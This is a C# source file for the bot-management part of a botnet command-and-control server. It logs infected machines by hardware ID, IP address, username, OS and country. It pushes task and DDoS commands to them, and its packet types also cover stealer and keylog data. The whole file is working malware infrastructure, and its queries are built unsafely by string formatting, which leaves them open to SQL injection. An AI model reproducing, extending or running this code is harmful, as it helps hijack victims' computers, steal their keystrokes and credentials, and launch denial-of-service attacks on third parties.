using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Data.SQLite;
using Server.Core.Config;
using Server.Core.Network;
using Server.Utilities;

namespace Server.Core.Handlers
{
    enum BOT_PACKET : byte
    {
        IDENT = 0x1,
        TASK = 0x2,
        DDOS = 0x3,
        STEALER = 0x4,
        KEYLOGS = 0x5,
        PING = 0x6
    }

    class CBot
    {
        public Int32 BotID;

        public IPAddress BotIPv4 { get; set; }

        public CClient BotClient { get; set; }

        public DateTime LastPing = DateTime.Now;
        public DateTime LastPong = DateTime.Now;

        public int CPU_Usage { get; set; }

        #region GET_USERNAME
        public string GetUsername()
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
                    string.Format(
                    "SELECT bot_username AS username FROM bots WHERE bot_id={0}",
                    this.BotID)
                    );

                if (Result.HasRows && Result.Read())
                    return Result["username"].ToString();
            }
            catch { }
            return string.Empty;
        }
        #endregion

        bool SendPacket(byte bPacket, string strArguments)
        {
            try
            {
                return BotClient.SendPacket(BotClient.CreatePacket(bPacket, strArguments));
            }
            catch { }

            return false;
        }

        public Boolean SendTask(string strArguments)
        {
            return this.SendPacket((byte)BOT_PACKET.TASK, strArguments);
        }

        public bool SendDdos(string strArguments)
        {
            return this.SendPacket((byte)BOT_PACKET.DDOS, strArguments);
        }

        public bool SendPing()
        {
            return this.SendPacket((byte)BOT_PACKET.PING, string.Empty);
        }
    }

    class CBotHandler
    {
        private List<CBot> lstBot = null;

        public CBotHandler()
        {
            lstBot = new List<CBot>();
        }

        public Boolean AddBot(CClient Client, String[] arr_strArguments)
        {

            try
            {
                CBot Bot = new CBot();
                Bot.BotClient = Client;
                try
                {
                    if(arr_strArguments.Length >= 5)
                        Bot.BotIPv4 = IPAddress.Parse(arr_strArguments[4]);
                }
                catch
                {
                    Bot.BotIPv4 = IPAddress.Parse("127.0.0.1");
                }

                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
                    String.Format(
                    "SELECT * FROM bots WHERE bot_hwid='{0}'",
                    arr_strArguments[3])
                    );

                if (Result.HasRows)
                {
                    if (Result.Read())
                    {
                        if (Int32.TryParse(Result["bot_id"].ToString(), out Bot.BotID))
                        {
                            CMain.DatabaseClient.ExecuteNonResultQuery(
                                string.Format(
                                "UPDATE bots SET bot_ipv4='{0}', bot_version='{1}', bot_os='{2}', bot_username='{3}', bot_hwid='{4}', bot_isonline=1 WHERE bot_id={5}",
                                Bot.BotIPv4.ToString(), arr_strArguments[0], arr_strArguments[1], arr_strArguments[2], arr_strArguments[3], Bot.BotID)
                                );
                        }
                    }

                }
                else
                {
                    Result = CMain.DatabaseClient.ExecuteReadQuery(
                        string.Format(
                        "INSERT INTO bots(bot_ipv4, bot_version, bot_os, bot_username, bot_hwid, bot_isonline, bot_country) VALUES('{0}', '{1}', '{2}', '{3}', '{4}', 1, '{5}'); SELECT * FROM bots WHERE bot_hwid='{4}'",
                        Bot.BotIPv4.ToString(), arr_strArguments[0], arr_strArguments[1], arr_strArguments[2], arr_strArguments[3], CMain.ls.getCountry(Bot.BotIPv4).getName())
                        );

                    if(Result.Read())
                    {
                        if (!Int32.TryParse(Result["bot_id"].ToString(), out Bot.BotID))
                            return false;
                    }
                }

                Console.WriteLine("[EVENT] New bot: IPv4: {0} | ID: {1}", Bot.BotIPv4.ToString(), Bot.BotID);

                lock (lstBot)
                {
                    lstBot.Add(Bot);
                }
                return true;
            }
            catch
            {

            }
            return false;

        }

        public Boolean RemoveBot(CClient Client)
        {
            lock (lstBot)
            {
                foreach (CBot Bot in lstBot.ToArray())
                {
                    if (Bot.BotClient == Client)
                    {
                    	
                    	CMain.DatabaseClient.ExecuteNonResultQuery(
                    		string.Format("UPDATE bots SET bot_isonline=0 WHERE bot_id={0}",
                    		              Bot.BotID));
                    	
                        return lstBot.Remove(Bot);
                    }
                }
                return false;
            }
        }

        public Boolean IsBot(CClient Client)
        {
            lock (lstBot)
            {
                foreach (CBot Bot in lstBot.ToArray())
                    if (Bot.BotClient == Client)
                        return true;
                return false;
            }
        }

        public Int32 GetTotalOnline()
        {
            lock (lstBot)
            {
                return lstBot.Count;
            }
        }

        public Int32 GetTotal()
        {
            try
            {
                int iTotal = CMain.DatabaseClient.ExecuteCountQuery("SELECT COUNT(*) FROM bots");
                return iTotal;
            }
            catch { }

            return 0;
        }

        public CBot GetBotByID(int iBotID)
        {
            try
            {
                lock(lstBot)
                {
                    foreach(CBot Bot in lstBot.ToArray())
                    {
                        if (Bot.BotID == iBotID)
                            return Bot;
                    }
                }
            }
            catch { }

            return null;
        }

        public string GetBotUsernameByID(int iBotID)
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(string.Format(
                    "SELECT bot_username FROM bots WHERE bot_id={0}", iBotID));

                if(Result.HasRows)
                {
                    if(Result.Read())
                        return Result[0].ToString();
                }
            }
            catch { }

            return string.Empty;
        }
        
        public String GetBotlist(Int32 iPage)
        {
        	if (iPage > CUtilities.GetPageCount(this.GetTotal())) return String.Empty;

            try
            {
                StringBuilder sbBotlist = new StringBuilder();

                String strQuery = String.Format("SELECT * FROM bots LIMIT {0}, {1}", (iPage - 1) * CConfig.ResultsPerPage, CConfig.ResultsPerPage);

                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(strQuery);

                if (Result.HasRows)
                {
                    while (Result.Read())
                    {
                        int iBotID = -1;

                        if (!int.TryParse(Result["bot_id"].ToString(), out iBotID)) 
                            continue;

                        int iOnline = -1;

                        if (!int.TryParse(Result["bot_isonline"].ToString(), out iOnline)) 
                            continue;

                        string strLatency = @"N/A";

                        if(iOnline == 1)
                        {
                            CBot Bot = this.GetBotByID(iBotID);

                            if (Bot != null)
                            {
                                double dPing = (Bot.LastPong - Bot.LastPing).TotalMilliseconds;
                                
                                //Because Get CPU Usage at Bot sleep(1000)
                                dPing -= 1000;

                                dPing = Math.Round(dPing, MidpointRounding.AwayFromZero);

                                strLatency = string.Format("{0}ms", dPing);
                            }
                        }

                        sbBotlist.AppendFormat("{0}*{1}*{2}*{3}*{4}*{5}*{6}*{7};",
                    	                       Result["bot_id"].ToString(),
                    	                       Result["bot_ipv4"].ToString(),
                    	                       Result["bot_version"].ToString(),
                    	                       Result["bot_os"].ToString(),
                    	                       Result["bot_username"].ToString(),
                    	                       Result["bot_hwid"].ToString(),
                    	                       strLatency, iOnline);
                    }
                }

                return sbBotlist.ToString();
            }
            catch
            {

            }
            return String.Empty;
        }

        public CBot[] GetBots()
        {
            lock(lstBot)
            {
                return lstBot.ToArray();
            }
        }

        public CBot GetBotBySocket(CClient Client)
        {
            lock(lstBot)
            {
                foreach(CBot Bot in lstBot.ToArray())
                {
                    if (Bot.BotClient == Client) return Bot;
                }
            }
            return null;
        }

        public void ReplaceBySocket(CClient Client, CBot Bot)
        {
            lock(lstBot)
            {
                for(int i = 0; i < lstBot.Count; i++)
                {
                    if (lstBot[i].BotClient == Client)
                        lstBot[i] = Bot;
                }
            }
        }

        public int GetAVGCPUUsage()
        {
            int iCPU = 0;

            lock(lstBot)
            {
                foreach(CBot Bot in lstBot.ToArray())
                {
                    iCPU += Bot.CPU_Usage;
                }
            }

            int iOnline = this.GetTotalOnline();

            if (iOnline > 0)
                iCPU /= iOnline;

            return iCPU;
        }

        public string GetOSInfo()
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery("SELECT bot_os FROM bots");

                if(Result.HasRows)
                {
                    StringBuilder sbOSInfo = new StringBuilder();

                    List<string> lstDoneOS = new List<string>();

                    while(Result.Read())
                    {
                        string strBotOS = Result[0].ToString();

                        if (lstDoneOS.Contains(strBotOS)) continue;

                        int iCount = CMain.DatabaseClient.ExecuteCountQuery(string.Format(
                            "SELECT COUNT(*) FROM bots WHERE bot_os='{0}'",
                            strBotOS));

                        if(iCount >= 0)
                        {
                            sbOSInfo.AppendFormat("{0}*{1};", strBotOS, iCount);
                            lstDoneOS.Add(strBotOS);
                        }
                    }

                    return sbOSInfo.ToString();
                }
            }
            catch { }

            return string.Empty;
        }

        public string GetCountryInfo()
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery("SELECT bot_country FROM bots");

                if (Result.HasRows)
                {
                    StringBuilder sbCountryInfo = new StringBuilder();

                    List<string> lstDoneCountry = new List<string>();

                    while (Result.Read())
                    {
                        string strBotCountry = Result[0].ToString();

                        if (lstDoneCountry.Contains(strBotCountry)) continue;

                        int iCount = CMain.DatabaseClient.ExecuteCountQuery(string.Format(
                            "SELECT COUNT(*) FROM bots WHERE bot_country='{0}'",
                            strBotCountry));

                        if (iCount >= 0)
                        {
                            sbCountryInfo.AppendFormat("{0}*{1};", strBotCountry, iCount);
                            lstDoneCountry.Add(strBotCountry);
                        }
                    }

                    return sbCountryInfo.ToString();
                }
            }
            catch { }

            return string.Empty;
        }
    }
}
